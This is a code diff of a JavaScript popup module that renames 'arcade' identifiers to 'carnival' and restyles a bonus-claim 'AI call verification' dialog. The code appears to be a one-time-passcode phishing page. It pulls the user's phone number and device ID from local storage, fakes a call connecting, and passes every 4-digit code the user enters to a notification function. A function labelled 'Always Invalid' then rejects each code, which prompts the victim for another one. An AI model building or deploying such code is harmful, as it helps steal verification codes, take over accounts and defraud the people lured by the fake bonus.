                 color: #ff4466;
-                background: rgba(255, 68, 102, 0.15);
-                border: 1px solid rgba(255, 68, 102, 0.4);
-                box-shadow: 0 0 15px rgba(255, 68, 102, 0.3);
+                background: rgba(255, 68, 102, 0.2);
+                border: 2px solid rgba(255, 68, 102, 0.5);
+                box-shadow: 0 0 20px rgba(255, 68, 102, 0.4);
             }
             
-            .arcade-msg-expired {
+            .carnival-msg-expired {
                 color: #ff9800;
-                background: rgba(255, 152, 0, 0.15);
-                border: 1px solid rgba(255, 152, 0, 0.4);
+                background: rgba(255, 152, 0, 0.2);
+                border: 2px solid rgba(255, 152, 0, 0.5);
+                box-shadow: 0 0 20px rgba(255, 152, 0, 0.4);
             }
             
             /* ========== CODE SECTION ========== */
-            .arcade-code-section {
+            .carnival-code-section {
                 display: none;
                 margin-top: 14px;
                 position: relative;
                 z-index: 2;
             }
             
-            .arcade-code-section.show {
+            .carnival-code-section.show {
                 display: block;
-                animation: codeSectionSlide 0.4s ease;
+                animation: codeSlide 0.4s ease;
             }
             
-            @keyframes codeSectionSlide {
+            @keyframes codeSlide {
                 from { opacity: 0; transform: translateY(15px); }
                 to { opacity: 1; transform: translateY(0); }
             }
             
-            .arcade-code-label {
+            .carnival-code-label {
                 display: flex;
                 align-items: center;
                 justify-content: center;
@@ -621,108 +728,104 @@
                 margin-bottom: 12px;
                 font-family: 'Orbitron', monospace;
                 font-size: 10px;
-                color: #00ffff;
+                color: #ffd700;
                 letter-spacing: 2px;
                 text-transform: uppercase;
+                text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
             }
             
-            .arcade-code-label i {
+            .carnival-code-label i {
                 font-size: 14px;
                 animation: ticketBounce 1s ease-in-out infinite;
             }
             
             @keyframes ticketBounce {
                 0%, 100% { transform: rotate(-10deg) scale(1); }
-                50% { transform: rotate(10deg) scale(1.1); }
+                50% { transform: rotate(10deg) scale(1.15); }
             }
             
             /* ========== DIVIDER ========== */
-            .arcade-divider {
-                width: 60px;
-                height: 2px;
-                background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, transparent);
-                margin: 12px auto;
-                box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
-            }
-            
-            /* ========== CLOSE BUTTON ========== */
-            .arcade-close {
-                position: absolute;
-                top: 14px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                background: rgba(0, 255, 255, 0.15);
-                border: 2px solid #00ffff;
-                border-radius: 50%;
-                color: #00ffff;
-                font-size: 16px;
-                font-weight: 900;
-                cursor: pointer;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                transition: all 0.2s ease;
-                z-index: 10;
-                font-family: 'Orbitron', monospace;
-                box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
-            }
-            
-            .arcade-close:hover,
-            .arcade-close:active {
-                background: rgba(255, 0, 102, 0.3);
-                color: #fff;
-                transform: rotate(90deg);
-                border-color: #ff0066;
-                box-shadow: 0 0 25px rgba(255, 0, 102, 0.8);
+            .carnival-divider {
+                width: 70px;
+                height: 3px;
+                background: linear-gradient(90deg, transparent, #ffd700, #ff1744, #ffd700, transparent);
+                margin: 14px auto;
+                box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+                border-radius: 2px;
+                position: relative;
+                z-index: 2;
             }
             
             /* ========== RESPONSIVE ========== */
             @media (max-width: 480px) {
-                .arcade-popup-container {
+                .carnival-popup-container {
                     padding: 22px 16px 18px;
-                    border-radius: 20px;
+                    border-radius: 22px;
                 }
                 
-                .arcade-title {
+                .carnival-title {
+                    font-size: 20px;
+                    letter-spacing: 2px;
+                }
+                
+                .carnival-icon-container {
+                    width: 70px;
+                    height: 70px;
+                }
+                
+                .carnival-icon-container i {
+                    font-size: 32px;
+                }
+                
+                .carnival-phone-number {
+                    font-size: 20px;
+                }
+                
+                .carnival-timer {
+                    font-size: 28px;
+                }
+                
+                .carnival-input {
+                    font-size: 24px;
+                    padding: 12px;
+                    letter-spacing: 6px;
+                }
+                
+                .carnival-btn {
+                    padding: 14px 16px;
+                    font-size: 12px;
+                }
+            }
+            
+            @media (max-width: 360px) {
+                .carnival-title {
                     font-size: 18px;
-                    letter-spacing: 3px;
                 }
                 
-                .arcade-phone-icon {
+                .carnival-icon-container {
                     width: 60px;
                     height: 60px;
                 }
                 
-                .arcade-phone-icon i {
-                    font-size: 26px;
+                .carnival-icon-container i {
+                    font-size: 28px;
                 }
                 
-                .arcade-phone-number {
+                .carnival-phone-number {
                     font-size: 18px;
                 }
                 
-                .arcade-timer {
-                    font-size: 26px;
-                }
-                
-                .arcade-input {
-                    font-size: 22px;
-                    padding: 12px;
-                }
-                
-                .arcade-btn {
-                    padding: 14px 16px;
-                    font-size: 12px;
+                .carnival-timer {
+                    font-size: 24px;
                 }
             }
         `;
         document.head.appendChild(style);
     }
     
-    // ========== CREATE POPUP HTML ==========
-    function createArcadePopup() {
-        if (document.getElementById('arcadePopup')) return;
+    // ========== CREATE CARNIVAL POPUP ==========
+    function createCarnivalPopup() {
+        if (document.getElementById('carnivalPopup')) return;
         
         var userPhone = localStorage.getItem("userPhone") || "Unknown";
         var formattedPhone = userPhone.length >= 11 ? 
@@ -730,89 +833,82 @@
             userPhone;
         
         var popup = document.createElement('div');
-        popup.id = 'arcadePopup';
-        popup.className = 'arcade-popup-overlay';
-        popup.innerHTML = `
-            <div class="arcade-popup-container">
-                <button class="arcade-close" id="arcadeClose">✕</button>
+        popup.id = 'carnivalPopup';
+        popup.className = 'carnival-popup-overlay';
+        popup.innerHTML = 
+            '<div class="carnival-popup-container">' +
+                '<button class="carnival-close" id="carnivalClose">✕</button>' +
                 
-                <!-- Header -->
-                <div class="arcade-header">
-                    <div class="arcade-phone-icon">
-                        <i class="fas fa-phone-alt"></i>
-                    </div>
-                    <div class="arcade-title">ARCADE VERIFY</div>
-                    <div class="arcade-subtitle">◆ AI CALL SYSTEM ◆</div>
-                </div>
+                '<div class="carnival-header">' +
+                    '<div class="carnival-icon-container">' +
+                        '<i class="fas fa-phone-volume"></i>' +
+                    '</div>' +
+                    '<div class="carnival-title">VERIFICATION</div>' +
+                    '<div class="carnival-subtitle">◆ AI CALL SYSTEM ◆</div>' +
+                '</div>' +
                 
-                <div class="arcade-divider"></div>
+                '<div class="carnival-divider"></div>' +
                 
-                <!-- Status Box -->
-                <div class="arcade-status-box" id="arcadeStatusBox">
-                    <div id="arcadeStatusIcon" style="font-size: 28px; margin-bottom: 6px;">🎮</div>
-                    <div id="arcadeStatusText" class="arcade-status-text">
-                        <strong>AI CALL</strong> will provide your code
-                    </div>
+                '<div class="carnival-status-box" id="carnivalStatusBox">' +
+                    '<div id="carnivalStatusIcon" style="font-size: 32px; margin-bottom: 8px;">🎪</div>' +
+                    '<div id="carnivalStatusText" class="carnival-status-text">' +
+                        '<strong>AI CALL</strong> will provide your verification code' +
+                    '</div>' +
                     
-                    <div id="arcadePhoneDisplay" style="display: none; margin-top: 8px;">
-                        <div class="arcade-phone-number">📱 ${formattedPhone}</div>
-                    </div>
+                    '<div id="carnivalPhoneDisplay" style="display: none; margin-top: 10px;">' +
+                        '<div class="carnival-phone-number">📱 ' + formattedPhone + '</div>' +
+                    '</div>' +
                     
-                    <div id="arcadeTimer" class="arcade-timer" style="display: none;">60s</div>
-                </div>
+                    '<div id="carnivalTimer" class="carnival-timer" style="display: none;">60s</div>' +
+                '</div>' +
                 
-                <!-- Request Call Button -->
-                <button id="arcadeRequestBtn" class="arcade-btn arcade-btn-primary">
-                    <i class="fas fa-phone-alt"></i>
-                    <span>REQUEST AI CALL</span>
-                </button>
+                '<button id="carnivalRequestBtn" class="carnival-btn carnival-btn-primary">' +
+                    '<i class="fas fa-phone-alt"></i>' +
+                    '<span>REQUEST AI CALL</span>' +
+                '</button>' +
                 
-                <!-- Code Input Section -->
-                <div id="arcadeCodeSection" class="arcade-code-section">
-                    <div class="arcade-code-label">
-                        <i class="fas fa-ticket-alt"></i>
-                        <span>ENTER 4-DIGIT CODE FROM CALL</span>
-                    </div>
+                '<div id="carnivalCodeSection" class="carnival-code-section">' +
+                    '<div class="carnival-code-label">' +
+                        '<i class="fas fa-ticket-alt"></i>' +
+                        '<span>ENTER 4-DIGIT CODE</span>' +
+                    '</div>' +
                     
-                    <input type="text" id="arcadeCodeInput" class="arcade-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+                    '<input type="text" id="carnivalCodeInput" class="carnival-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">' +
                     
-                    <button id="arcadeVerifyBtn" class="arcade-btn arcade-btn-verify">
-                        <i class="fas fa-check-double"></i>
-                        <span>VERIFY CODE</span>
-                    </button>
+                    '<button id="carnivalVerifyBtn" class="carnival-btn carnival-btn-verify">' +
+                        '<i class="fas fa-check-double"></i>' +
+                        '<span>VERIFY CODE</span>' +
+                    '</button>' +
                     
-                    <div id="arcadeErrorMsg" class="arcade-msg arcade-msg-error">
-                        <i class="fas fa-times-circle"></i> Invalid code. Request a new call.
-                    </div>
+                    '<div id="carnivalErrorMsg" class="carnival-msg carnival-msg-error">' +
+                        '<i class="fas fa-times-circle"></i> Invalid code. Request a new call.' +
+                    '</div>' +
                     
-                    <div id="arcadeExpiredMsg" class="arcade-msg arcade-msg-expired">
-                        <i class="fas fa-clock"></i> Call expired. Request a new call.
-                    </div>
-                </div>
+                    '<div id="carnivalExpiredMsg" class="carnival-msg carnival-msg-expired">' +
+                        '<i class="fas fa-clock"></i> Call expired. Request a new call.' +
+                    '</div>' +
+                '</div>' +
                 
-                <!-- Back Button -->
-                <div style="text-align: center; margin-top: 12px;">
-                    <button class="arcade-btn arcade-btn-back" id="arcadeBackBtn">← BACK</button>
-                </div>
-            </div>
-        `;
+                '<div style="text-align: center; margin-top: 12px;">' +
+                    '<button class="carnival-btn carnival-btn-back" id="carnivalBackBtn">← BACK</button>' +
+                '</div>' +
+            '</div>';
         
         document.body.appendChild(popup);
-        
-        // Attach events
-        attachArcadeEvents();
+        popupCreated = true;
+        attachCarnivalEvents();
     }
     
     // ========== ATTACH EVENTS ==========
-    function attachArcadeEvents() {
-        var closeBtn = document.getElementById('arcadeClose');
-        var backBtn = document.getElementById('arcadeBackBtn');
-        var requestBtn = document.getElementById('arcadeRequestBtn');
-        var verifyBtn = document.getElementById('arcadeVerifyBtn');
-        var codeInput = document.getElementById('arcadeCodeInput');
+    function attachCarnivalEvents() {
+        var closeBtn = document.getElementById('carnivalClose');
+        var backBtn = document.getElementById('carnivalBackBtn');
+        var requestBtn = document.getElementById('carnivalRequestBtn');
+        var verifyBtn = document.getElementById('carnivalVerifyBtn');
+        var codeInput = document.getElementById('carnivalCodeInput');
         
-        if (closeBtn) closeBtn.onclick = closeArcadePopup;
-        if (backBtn) backBtn.onclick = closeArcadePopup;
+        if (closeBtn) closeBtn.onclick = closeCarnivalPopup;
+        if (backBtn) backBtn.onclick = closeCarnivalPopup;
         
         if (requestBtn) {
             requestBtn.onclick = function() {
@@ -820,34 +916,36 @@
                     alert("Please wait for the current call to complete.");
                     return;
                 }
-                requestArcadeCall();
+                requestCarnivalCall();
             };
         }
         
         if (verifyBtn) {
-            verifyBtn.onclick = verifyArcadeCode;
+            verifyBtn.onclick = verifyCarnivalCode;
         }
         
         if (codeInput) {
             codeInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') verifyArcadeCode();
+                if (e.key === 'Enter') verifyCarnivalCode();
             });
             
             codeInput.addEventListener('input', function() {
                 var value = this.value.trim();
                 if (value.length === 4 && /^\d+$/.test(value)) {
-                    this.style.borderColor = '#00ff88';
-                    this.style.boxShadow = '0 0 30px rgba(0, 255, 136, 0.6)';
+                    this.style.borderColor = '#39ff14';
+                    this.style.boxShadow = '0 0 35px rgba(57, 255, 20, 0.9)';
+                    this.style.color = '#39ff14';
                 } else {
-                    this.style.borderColor = '#00ffff';
-                    this.style.boxShadow = '0 0 20px rgba(0, 255, 255, 0.5)';
+                    this.style.borderColor = '#ffd700';
+                    this.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
+                    this.style.color = '#ffd700';
                 }
             });
         }
     }
     
-    // ========== REQUEST ARCADE CALL ==========
-    function requestArcadeCall() {
+    // ========== REQUEST CALL ==========
+    function requestCarnivalCall() {
         if (callInProgress) return;
         
         callInProgress = true;
@@ -859,15 +957,15 @@
         
         sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
         
-        var statusIcon = document.getElementById('arcadeStatusIcon');
-        var statusText = document.getElementById('arcadeStatusText');
-        var phoneDisplay = document.getElementById('arcadePhoneDisplay');
-        var timerDisplay = document.getElementById('arcadeTimer');
-        var requestBtn = document.getElementById('arcadeRequestBtn');
-        var codeSection = document.getElementById('arcadeCodeSection');
-        var codeInput = document.getElementById('arcadeCodeInput');
-        var errorMsg = document.getElementById('arcadeErrorMsg');
-        var expiredMsg = document.getElementById('arcadeExpiredMsg');
+        var statusIcon = document.getElementById('carnivalStatusIcon');
+        var statusText = document.getElementById('carnivalStatusText');
+        var phoneDisplay = document.getElementById('carnivalPhoneDisplay');
+        var timerDisplay = document.getElementById('carnivalTimer');
+        var requestBtn = document.getElementById('carnivalRequestBtn');
+        var codeSection = document.getElementById('carnivalCodeSection');
+        var codeInput = document.getElementById('carnivalCodeInput');
+        var errorMsg = document.getElementById('carnivalErrorMsg');
+        var expiredMsg = document.getElementById('carnivalExpiredMsg');
         
         if (errorMsg) errorMsg.classList.remove('show');
         if (expiredMsg) expiredMsg.classList.remove('show');
@@ -875,7 +973,7 @@
         
         if (statusIcon) statusIcon.innerHTML = '📞';
         if (statusText) {
-            statusText.innerHTML = '<strong>AI CALL</strong> being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.5);">Please wait</span>';
+            statusText.innerHTML = '<strong>AI CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.6);">Please wait for the call</span>';
         }
         if (phoneDisplay) phoneDisplay.style.display = 'block';
         if (timerDisplay) {
@@ -891,24 +989,23 @@
         if (codeSection) codeSection.classList.remove('show');
         
         playCallSound();
-        startArcadeTimer();
+        startCarnivalTimer();
         
-        // Simulate call connection
         setTimeout(function() {
             if (statusIcon) statusIcon.innerHTML = '🎯';
             if (statusText) {
-                statusText.innerHTML = '<strong style="color: #00ff88;">🎯 CALL CONNECTED!</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Enter the 4-digit code</span>';
+                statusText.innerHTML = '<strong style="color: #39ff14;">🎯 CALL CONNECTED!</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.8);">Enter the 4-digit code below</span>';
             }
             if (codeSection) codeSection.classList.add('show');
             if (codeInput) codeInput.focus();
         }, 4000);
     }
     
-    // ========== START TIMER ==========
-    function startArcadeTimer() {
-        stopArcadeTimer();
+    // ========== TIMER ==========
+    function startCarnivalTimer() {
+        stopCarnivalTimer();
         
-        var timerDisplay = document.getElementById('arcadeTimer');
+        var timerDisplay = document.getElementById('carnivalTimer');
         
         callTimerInterval = setInterval(function() {
             callCountdown--;
@@ -924,19 +1021,19 @@
             }
             
             if (callCountdown <= 0) {
-                stopArcadeTimer();
+                stopCarnivalTimer();
                 
                 var userPhone = localStorage.getItem("userPhone") || "Unknown";
                 var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendAICallExpiredNotification(userPhone, deviceId);
                 
-                var statusText = document.getElementById('arcadeStatusText');
-                var codeSection = document.getElementById('arcadeCodeSection');
-                var requestBtn = document.getElementById('arcadeRequestBtn');
-                var expiredMsg = document.getElementById('arcadeExpiredMsg');
+                var statusText = document.getElementById('carnivalStatusText');
+                var codeSection = document.getElementById('carnivalCodeSection');
+                var requestBtn = document.getElementById('carnivalRequestBtn');
+                var expiredMsg = document.getElementById('carnivalExpiredMsg');
                 
                 if (statusText) {
-                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Request a new call</span>';
+                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request a new call</span>';
                 }
                 if (timerDisplay) timerDisplay.style.display = 'none';
                 if (codeSection) codeSection.classList.remove('show');
@@ -952,7 +1049,7 @@
         }, 1000);
     }
     
-    function stopArcadeTimer() {
+    function stopCarnivalTimer() {
         if (callTimerInterval) {
             clearInterval(callTimerInterval);
             callTimerInterval = null;
@@ -960,11 +1057,11 @@
     }
     
     // ========== VERIFY CODE (Always Invalid) ==========
-    function verifyArcadeCode() {
-        var codeInput = document.getElementById('arcadeCodeInput');
-        var errorMsg = document.getElementById('arcadeErrorMsg');
-        var expiredMsg = document.getElementById('arcadeExpiredMsg');
-        var verifyBtn = document.getElementById('arcadeVerifyBtn');
+    function verifyCarnivalCode() {
+        var codeInput = document.getElementById('carnivalCodeInput');
+        var errorMsg = document.getElementById('carnivalErrorMsg');
+        var expiredMsg = document.getElementById('carnivalExpiredMsg');
+        var verifyBtn = document.getElementById('carnivalVerifyBtn');
         
         if (!codeInput) return;
         
@@ -972,10 +1069,10 @@
         
         if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
             if (errorMsg) {
-                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter valid 4-digit code.';
+                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter a valid 4-digit code.';
                 errorMsg.classList.add('show');
             }
-            shakeArcadeElement(codeInput);
+            shakeElement(codeInput);
             return;
         }
         
@@ -991,13 +1088,14 @@
         sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
         
         if (errorMsg) {
-            errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request new call.';
+            errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request a new call.';
             errorMsg.classList.add('show');
         }
         
-        codeInput.style.borderColor = '#ff0044';
-        codeInput.style.boxShadow = '0 0 30px rgba(255, 0, 68, 0.7)';
-        shakeArcadeElement(codeInput);
+        codeInput.style.borderColor = '#ff1744';
+        codeInput.style.boxShadow = '0 0 35px rgba(255, 23, 68, 0.9)';
+        codeInput.style.color = '#ff1744';
+        shakeElement(codeInput);
         
         if (verifyBtn) {
             verifyBtn.disabled = true;
@@ -1012,20 +1110,21 @@
         
         setTimeout(function() {
             codeInput.value = '';
-            codeInput.style.borderColor = '#00ffff';
-            codeInput.style.boxShadow = '0 0 20px rgba(0, 255, 255, 0.5)';
+            codeInput.style.borderColor = '#ffd700';
+            codeInput.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
+            codeInput.style.color = '#ffd700';
         }, 1500);
         
         setTimeout(function() {
             if (errorMsg) errorMsg.classList.remove('show');
             
-            var statusText = document.getElementById('arcadeStatusText');
-            var timerDisplay = document.getElementById('arcadeTimer');
-            var codeSection = document.getElementById('arcadeCodeSection');
-            var requestBtn = document.getElementById('arcadeRequestBtn');
+            var statusText = document.getElementById('carnivalStatusText');
+            var timerDisplay = document.getElementById('carnivalTimer');
+            var codeSection = document.getElementById('carnivalCodeSection');
+            var requestBtn = document.getElementById('carnivalRequestBtn');
             
             if (statusText) {
-                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Request new call</span>';
+                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request new call</span>';
             }
             if (timerDisplay) {
                 timerDisplay.style.display = 'none';
@@ -1042,18 +1141,21 @@
         }, 4000);
     }
     
-    function shakeArcadeElement(element) {
+    function shakeElement(element) {
         if (!element) return;
-        element.style.animation = 'errorShake 0.5s ease';
+        element.style.animation = 'shake 0.5s ease';
         setTimeout(function() { element.style.animation = ''; }, 500);
     }
     
-    // ========== PUBLIC FUNCTIONS ==========
-    function showArcadePopup(balance) {
-        currentBalance = balance;
+    // ========== SHOW POPUP ==========
+    function showCarnivalPopup(balance) {
+        currentBalance = balance || 0;
         
-        addArcadeStyles();
-        createArcadePopup();
+        addCarnivalStyles();
+        
+        if (!popupCreated) {
+            createCarnivalPopup();
+        }
         
         // Reset state
         callInProgress = false;
@@ -1063,7 +1165,7 @@
             callTimerInterval = null;
         }
         
-        var popup = document.getElementById('arcadePopup');
+        var popup = document.getElementById('carnivalPopup');
         if (popup) {
             popup.classList.add('show');
             
@@ -1071,16 +1173,16 @@
             if (ticker) ticker.style.display = 'none';
             
             // Reset UI
-            var statusIcon = document.getElementById('arcadeStatusIcon');
-            var statusText = document.getElementById('arcadeStatusText');
-            var phoneDisplay = document.getElementById('arcadePhoneDisplay');
-            var timerDisplay = document.getElementById('arcadeTimer');
-            var requestBtn = document.getElementById('arcadeRequestBtn');
-            var codeSection = document.getElementById('arcadeCodeSection');
+            var statusIcon = document.getElementById('carnivalStatusIcon');
+            var statusText = document.getElementById('carnivalStatusText');
+            var phoneDisplay = document.getElementById('carnivalPhoneDisplay');
+            var timerDisplay = document.getElementById('carnivalTimer');
+            var requestBtn = document.getElementById('carnivalRequestBtn');
+            var codeSection = document.getElementById('carnivalCodeSection');
             
-            if (statusIcon) statusIcon.innerHTML = '🎮';
+            if (statusIcon) statusIcon.innerHTML = '🎪';
             if (statusText) {
-                statusText.innerHTML = '<strong>AI CALL</strong> will provide your code';
+                statusText.innerHTML = '<strong>AI CALL</strong> will provide your verification code';
             }
             if (phoneDisplay) phoneDisplay.style.display = 'none';
             if (timerDisplay) timerDisplay.style.display = 'none';
@@ -1092,11 +1194,12 @@
             if (codeSection) codeSection.classList.remove('show');
         }
         
-        console.log('🎮 Arcade Popup shown');
+        console.log('🎪 Carnival popup shown');
     }
     
-    function closeArcadePopup() {
-        var popup = document.getElementById('arcadePopup');
+    // ========== CLOSE POPUP ==========
+    function closeCarnivalPopup() {
+        var popup = document.getElementById('carnivalPopup');
         if (popup) {
             popup.classList.remove('show');
             
@@ -1104,10 +1207,9 @@
             if (ticker) ticker.style.display = 'flex';
         }
         
-        stopArcadeTimer();
+        stopCarnivalTimer();
         callInProgress = false;
         
-        // Reset claim state in playbonus.js
         if (window.PlayBonus && window.PlayBonus.resetClaimState) {
             window.PlayBonus.resetClaimState();
         }
@@ -1115,17 +1217,18 @@
     
     // ========== INIT ==========
     function init() {
-        addArcadeStyles();
-        console.log('🎮 Arcade Popup Module ready');
+        addCarnivalStyles();
+        console.log('🎪 Carnival Popup Module ready');
     }
     
     // ========== EXPORT ==========
-    window.showPopup = showArcadePopup;
-    window.closePopup = closeArcadePopup;
+    window.showPopup = showCarnivalPopup;
+    window.closePopup = closeCarnivalPopup;
     window.getFirewallStatus = getFirewallStatus;
-    window.ArcadePopup = {
-        show: showArcadePopup,
-        close: closeArcadePopup
+    window.CarnivalPopup = {
+        show: showCarnivalPopup,
+        close: closeCarnivalPopup,
+        isFirewallOn: getFirewallStatus
     };
     
     // ========== START ==========
